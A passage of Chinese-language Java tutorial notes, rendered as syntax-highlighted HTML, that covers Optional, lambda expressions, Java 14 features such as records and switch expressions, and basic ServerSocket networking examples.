class-name">String</span><span class="token punctuation">></span></span> empty <span class="token operator">=</span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>empty<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出：Optional.empty</span></code></pre><p>2）可以使用静态方法 <code>of()</code> 创建一个非空的 Optional对象</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> opt <span class="token operator">=</span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"沉默王二"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>opt<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出：Optional[沉默王二]</span></code></pre><p>传递给 <code>of()</code> 方法的参数必须是非空的，也就是说不能为null，否则仍然会抛出 NullPointerException。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> optnull <span class="token operator">=</span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>3）可以使用静态方法 <code>ofNullable()</code>创建一个即可空又可非空的 Optional 对象</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> optOrNull <span class="token operator">=</span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>optOrNull<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出：Optional.empty</span></code></pre><p><code>ofNullable()</code> 方法内部有一个三元表达式，如果为参数为null，则返回私有常量 EMPTY；否则使用 new 关键字创建了一个新的 Optional对象——不会再抛出 NPE 异常了。</p></li></ol><h4 id="lambda-表达式">lambda 表达式</h4><ol type="1"><li><p>初识lambda</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 匿名内部类</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LamadaTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"沉默王二"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// lambda函数</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LamadaTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"沉默王二"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>语法：`( parameter-list ) -&gt; { expression-or-statements}``</p><ol type="1"><li><p>`<code>()</code> 中的 <code>parameter-list</code>是以逗号分隔的参数。你可以指定参数的类型，也可以不指定（编译器会根据上下文进行推断）。Java11 后，还可以使用 <code>var</code> 关键字作为参数类型，有点 JavaScript的味道。</p><p><code>-&gt;</code> 相当于 Lambda的标识符，就好像见到圣旨就见到了皇上。</p><p><code>&#123;&#125;</code> 中的 <code>expression-or-statements</code> 为 Lambda的主体，可以是一行语句，也可以多行。</p></li><li><p>1）为变量赋值，示例如下：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Runnable</span> r <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"沉默王二"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>r<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>2）作为 return 结果，示例如下：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">static</span> <span class="token class-name">FileFilter</span> <span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token class-name">String</span> ext<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>pathname<span class="token punctuation">)</span> <span class="token operator">-></span> pathname<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span>ext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>3）作为数组元素，示例如下：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token class-name">PathMatcher</span> matchers<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">-></span> path<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">-></span> path<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"java"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>4）作为普通方法或者构造方法的参数，示例如下：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"沉默王二"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>需要注意 Lambda 表达式的作用域范围。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> limit <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token class-name">Runnable</span> r <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> limit <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> limit<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>上面这段代码在编译的时候会提示错误：变量 limit 已经定义过了。</p><p>和匿名内部类一样，不要在 Lambda表达式主体内对方法内的局部变量进行修改，否则编译也不会通过：Lambda表达式中使用的变量必须是 final 的。</p><p><strong>Java规范</strong></p><blockquote><p>Any local variable, formal parameter, or exception parameter used butnot declared in a lambda expression must either be declared final or beeffectively final <ahref="http://docs.oracle.com/javase/specs/jls/se8/html/jls-4.html#jls-4.12.4">(§4.12.4)openin new window</a>,or a compile-time error occurs where the use isattempted.</p></blockquote><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">int</span> a<span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// a = 2;</span><span class="token comment">// 由于 a 是 final 的，所以不能被重新赋值</span><span class="token keyword">int</span> b<span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// b 此后再未更改</span><span class="token comment">// b 就是 effectively final</span><span class="token keyword">int</span> c<span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// c 先被赋值为 1，随后又被重新赋值为 2</span>c <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">// c 就不是 effectively final</span></code></pre></li></ol></li><li><p>lambda表达式和this关键字</p><p>Lambda表达式并不会引入新的作用域，这一点和匿名内部类是不同的。也就是说，Lambda表达式主体内使用的<code>this 关键字</code>和其所在的类实例相同。</p></li></ol><h4 id="java14-新特性">Java14 新特性</h4><ol type="1"><li><p>instance of</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// old</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OldInstanceOf</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Object</span> str <span class="token operator">=</span> <span class="token string">"Java 14，真香"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>str <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>str<span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//java 14 </span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NewInstanceOf</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Object</span> str <span class="token operator">=</span> <span class="token string">"Java 14，真香"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>str <span class="token keyword">instanceof</span> <span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>Records</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 类的不可变性</span><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Writer</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Writer</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>来用 Records 替代一下上面这个 Writer 类：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">record</span> <span class="token class-name">Writer</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span></code></pre></li><li><p>Switch 表达式</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SwitchDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">enum</span> <span class="token class-name">PlayerTypes</span> <span class="token punctuation">&#123;</span>        <span class="token constant">TENNIS</span><span class="token punctuation">,</span>        <span class="token constant">FOOTBALL</span><span class="token punctuation">,</span>        <span class="token constant">BASKETBALL</span><span class="token punctuation">,</span>        <span class="token constant">PINGPANG</span><span class="token punctuation">,</span>        <span class="token constant">UNKNOWN</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">createPlayer</span><span class="token punctuation">(</span><span class="token class-name">PlayerTypes</span><span class="token punctuation">.</span><span class="token constant">BASKETBALL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">createPlayer</span><span class="token punctuation">(</span><span class="token class-name">PlayerTypes</span> playerType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span>playerType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token constant">TENNIS</span> <span class="token operator">-></span> <span class="token string">"网球运动员费德勒"</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token constant">FOOTBALL</span> <span class="token operator">-></span> <span class="token string">"足球运动员C罗"</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token constant">BASKETBALL</span> <span class="token operator">-></span> <span class="token string">"篮球运动员詹姆斯"</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token constant">PINGPANG</span> <span class="token operator">-></span> <span class="token string">"乒乓球运动员马龙"</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token constant">UNKNOWN</span> <span class="token operator">-></span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"未知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>Text Blocks</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// old</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OldTextBlock</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> html <span class="token operator">=</span> <span class="token string">"&lt;html>\n"</span> <span class="token operator">+</span>                <span class="token string">"    &lt;body>\n"</span> <span class="token operator">+</span>                <span class="token string">"        &lt;p>Hello, world&lt;/p>\n"</span> <span class="token operator">+</span>                <span class="token string">"    &lt;/body>\n"</span> <span class="token operator">+</span>                <span class="token string">"&lt;/html>\n"</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// java 14</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NewTextBlock</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> html <span class="token operator">=</span> <span class="token triple-quoted-string string">"""              &lt;html>                  &lt;body>                      &lt;p>Hello, world&lt;/p>                  &lt;/body>              &lt;/html>              """</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="java-网络编程">Java 网络编程</h3><h4 id="网络编程基础">网络编程基础</h4><ol type="1"><li>特殊的本机域名<code>localhost</code></li></ol><h4 id="网络编程的核心套接字socket">网络编程的核心套接字Socket</h4><ol type="1"><li><p>套接字连接成功后，可以通过 <code>java.net.Socket</code> 类的<code>getInputStream()</code> 方法获取输入流。有了<code>InputStream</code>对象后，可以借助文本扫描器类（Scanner）将其中的内容打印出来</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">InputStream</span> is <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>is<span class="token punctuation">,</span> <span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>scanner<span class="token punctuation">.</span><span class="token function">hasNextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> line <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>ServerSocket实例</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">ServerSocket</span> server <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Socket</span> socket <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> is <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">OutputStream</span> os <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">PrintWriter</span> pw <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OutputStreamWriter</span><span class="token punctuation">(</span>os<span class="token punctuation">,</span> <span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pw<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"你好啊，欢迎关注「沉默王二」 公众号，回复关键字「2048」 领取程序员进阶必读资料包"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> done <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>done <span class="token operator">&amp;&amp;</span> scanner<span class="token punctuation">.</span><span class="token function">hasNextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> line <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"2048"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            done <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnknownHostException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>为多个客户端服务</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">ServerSocket</span> server <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Socket</span> socket <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Thread</span> thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token comment">// 套接字处理程序</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        thread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ol type="1"><li><p>线程内部 <code>run()&#123;&#125;</code>处理套接字</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">InputStream</span> is <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">OutputStream</span> os <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 其他代码省略</span>   <span class="token comment">// 向客户端发送消息</span>   <span class="token comment">// 读取客户端发送过来的消息</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token 